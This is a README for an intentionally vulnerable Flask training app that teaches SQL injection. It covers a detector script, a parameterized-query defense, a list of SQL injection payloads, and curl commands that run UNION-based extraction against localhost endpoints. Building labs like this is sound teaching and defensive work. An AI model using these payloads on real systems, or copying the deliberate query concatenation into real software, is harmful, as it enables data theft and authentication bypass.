# SQLi Playground

A simple educational Flask app with intentional SQL injection vulnerabilities and a Python detector.

## What is included

- `app_extended.py` - Full Flask playground with vulnerable login, search, product pages, profiles, hidden admin search, and challenges.
- `init_db_extended.py` - Creates a SQLite database with users, products, orders, feedback, employee profiles, and hidden admin tables.
- `detector.py` - Interactive SQL injection scanner and logger.
- `templates/` - HTML pages for the playground.
- `requirements.txt` - Python dependencies.

## Setup

1. Create a virtual environment:
   ```powershell
   python -m venv .venv
   .\.venv\Scripts\Activate.ps1
   ```
2. Install dependencies:
   ```powershell
   python -m pip install -r requirements.txt
   ```
3. If `C:` is full, set a fallback storage root on `D:`:
   ```powershell
   $env:SQLI_PLAYGROUND_ROOT = 'D:\SQLi-playground-data'
   ```
4. Initialize the extended database:
   ```powershell
   python init_db_extended.py
   ```
5. Run the full app:
   ```powershell
   python app_extended.py
   ```
6. Open `http://127.0.0.1:5000` in your browser.

## Using the vulnerable app

- Login page is intentionally vulnerable to SQL injection in `app_extended.py`.
- Search page uses raw query concatenation in `/search` and parameterized query in `/search-safe`.
- Hidden admin search is available at `/admin-search` and can be used to extract hidden rows.

### Example payloads

- `' OR '1'='1`
- `admin' -- `
- `' UNION SELECT 1, username, role FROM users -- `
- `' AND sleep(5) -- `

## SQLi Challenges & Commands

### 1. Extract the admin username

Use the hidden admin search page:
```powershell
curl -X POST http://127.0.0.1:5000/admin-search -d "q=%' UNION SELECT 1, admin_name, secret FROM admin_search -- "
```

Or using the vulnerable user search page:
```powershell
curl -X POST http://127.0.0.1:5000/search -d "q=%' UNION SELECT 1, admin_name, secret FROM admin_search -- "
```

If successful, the response will show the hidden `admin_name` value such as `superadmin`.

### 2. Find the number of columns

Test with a UNION payload in `/products` or `/search`:
```powershell
curl -X POST http://127.0.0.1:5000/products -d "q=%' UNION SELECT NULL, NULL, NULL -- "
```

Increase or decrease the number of `NULL` values until the query executes without error.

### 3. Discover database metadata

On vulnerable endpoints, try error-based enumeration:
```powershell
curl -X POST http://127.0.0.1:5000/search -d "q=%' UNION SELECT 1, sql, NULL FROM sqlite_master WHERE type='table' -- "
```

### 4. List tables and extract hidden data

Use the SQLite master table:
```powershell
curl -X POST http://127.0.0.1:5000/search -d "q=%' UNION SELECT 1, name, sql FROM sqlite_master -- "
```

### 5. Use the challenge page

Open `/challenges` to follow the mission path and verify your findings. You can also use extracted admin data to attempt administrator bypass on `/login`.

## Using the detector

Run:
```powershell
python detector.py
```

Then choose one of:

1. Scan login page
2. Scan search page
3. Show detection log
4. Exit

The detector logs findings to `detector.log`.

## Defense demonstration

The `/search-safe` route shows how parameterized queries prevent SQL injection.

## Notes

- The app is intentionally insecure and only for learning.
- Do not deploy this code to a public server.
